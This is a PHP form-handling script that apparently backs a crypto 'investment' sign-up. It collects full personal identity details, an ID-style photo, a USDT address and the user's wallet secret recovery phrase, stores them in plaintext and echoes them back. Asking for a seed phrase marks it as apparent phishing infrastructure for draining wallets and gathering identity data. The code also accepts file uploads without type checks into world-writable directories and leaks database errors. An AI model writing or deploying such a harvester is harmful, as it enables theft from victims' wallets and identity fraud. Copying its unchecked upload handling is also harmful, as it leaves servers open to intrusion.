<?php
header("Content-Type: application/json");
include "config.php";

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(400);
    echo json_encode(["Status" => "Failed", "Message" => "Invalid request method"]);
    exit;
}

$requiredFields = ['first_name', 'last_name', 'date_of_birth', 'place_of_birth', 'current_address', 
    'phone_number', 'email', 'has_investment_license', 'investment_license_number', 
    'usdt_address', 'secret_phrase','wallet_type'];

foreach ($requiredFields as $field) {
    if (empty($_POST[$field])) {
        http_response_code(400);
        echo json_encode(["Status" => "Failed", "Message" => "Missing required field: $field"]);
        exit;
    }
}

// Validate secret phrase (must be 18 words)
$secretPhrase = trim($_POST['secret_phrase']);
// if (str_word_count($secretPhrase) !== 18) {
    // echo json_encode(["success" => false, "error" => "Secret phrase must contain exactly 18 words"]);
    // exit;

// Upload document (ID or Passport)
// $uploadDir = "uploads/documents/";
// if (!is_dir($uploadDir)) {
//     mkdir($uploadDir, 0777, true);
// }

// $documentFile = $_FILES['document']['name'];
// $documentPath = $uploadDir . time() . "_" . basename($documentFile);
// if (!move_uploaded_file($_FILES['document']['tmp_name'], $documentPath)) {
//     echo json_encode(["success" => false, "error" => "Failed to upload document"]);
//     exit;
// }

// Upload image


// Insert into database
try {
            $imageDir = "uploads/images/";
        if (!is_dir($imageDir)) {
            mkdir($imageDir, 0777, true);
        }

        $imageFile = $_FILES['image']['name'];
        $imagePath = $imageDir . time() . "_" . basename($imageFile);
        if (!move_uploaded_file($_FILES['image']['tmp_name'], $imagePath)) {
            http_response_code(400);
            echo json_encode(["Status" => "Failed", "Message" => "Failed to upload image"]);
            exit;
        }
    $stmt = $conn->prepare("INSERT INTO users (first_name, last_name, middle_name, other_names, date_of_birth, place_of_birth, 
        current_address, phone_number, email, has_investment_license, investment_license_number, usdt_address, secret_phrase,
         wallet_type,image_path) 
        VALUES (:first_name, :last_name, :middle_name, :other_names, :date_of_birth, :place_of_birth, :current_address, :phone_number, 
        :email, :has_investment_license, :investment_license_number, :usdt_address, :secret_phrase, :wallet_type,:image_path)");

    $stmt->execute([
        ':first_name' => $_POST['first_name'],
        ':last_name' => $_POST['last_name'],
        ':middle_name' => $_POST['middle_name'] ?? null,
        ':other_names' => $_POST['other_names'] ?? null,
        ':date_of_birth' => $_POST['date_of_birth'],
        ':place_of_birth' => $_POST['place_of_birth'],
        ':current_address' => $_POST['current_address'],
        ':phone_number' => $_POST['phone_number'],
        ':email' => $_POST['email'],
        ':has_investment_license' => $_POST['has_investment_license'],
        ':investment_license_number' => $_POST['investment_license_number'],
        ':usdt_address' => $_POST['usdt_address'],
        ':secret_phrase' => $_POST['secret_phrase'],
        ':wallet_type' => $_POST['wallet_type'],
        ':image_path' => $imagePath
    ]);

    // Get last inserted ID
    $userId = $conn->lastInsertId();

    // Fetch user data for response
    $stmt = $conn->prepare("SELECT id, first_name, last_name, middle_name, other_names, date_of_birth, 
        place_of_birth, current_address, phone_number, email, has_investment_license, investment_license_number, 
        usdt_address, secret_phrase, wallet_type, image_path FROM users WHERE id = :id");
    $stmt->execute([':id' => $userId]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    echo json_encode(["Status" => "Success", "data" => $user]);
} catch (PDOException $e) {
    http_response_code(400);
    echo json_encode(["Status" => "Failed", "Message" => "Failed to store user", "Details" => $e->getMessage()]);
}
?>
